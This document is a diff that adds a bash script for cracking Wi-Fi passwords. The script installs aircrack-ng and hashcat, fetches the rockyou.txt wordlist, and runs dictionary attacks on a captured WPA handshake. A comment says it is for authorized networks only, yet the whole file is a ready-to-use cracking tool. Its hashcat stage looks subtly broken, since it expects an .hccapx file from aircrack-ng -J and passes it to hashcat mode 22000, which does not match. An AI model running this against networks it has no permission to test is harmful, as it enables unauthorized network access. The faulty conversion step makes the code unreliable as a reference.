@@ -1,0 +1,46 @@
+#!/bin/bash
+# Wi-Fi handshake test script (authorized networks only)
+
+if [ -z "$1" ]; then
+  echo "Usage: bash crackwifi.sh <handshake.cap|pcap|pcapng>"
+  exit 1
+fi
+
+CAPFILE="$1"
+
+# 1. Check tools
+for tool in aircrack-ng hashcat wget; do
+  if ! command -v $tool &>/dev/null; then
+    echo "Installing $tool..."
+    if command -v pkg &>/dev/null; then
+      pkg install $tool -y
+    elif command -v apt &>/dev/null; then
+      sudo apt install $tool -y
+    fi
+  fi
+done
+
+# 2. Download rockyou.txt if missing
+if [ ! -f rockyou.txt ]; then
+  echo "Downloading rockyou.txt wordlist..."
+  wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+fi
+
+# 3. Try Aircrack
+echo "Running Aircrack..."
+aircrack-ng "$CAPFILE" -w rockyou.txt
+if [ $? -eq 0 ]; then
+  echo "Aircrack run finished."
+fi
+
+# 4. Convert for Hashcat and try
+BASENAME=$(basename "$CAPFILE" | sed 's/\..*//')
+aircrack-ng "$CAPFILE" -J "$BASENAME"
+if [ -f "$BASENAME.hccapx" ]; then
+  echo "Running Hashcat..."
+  hashcat -m 22000 "$BASENAME.hccapx" rockyou.txt
+else
+  echo "Hashcat conversion failed."
+fi
+
+echo "Done."
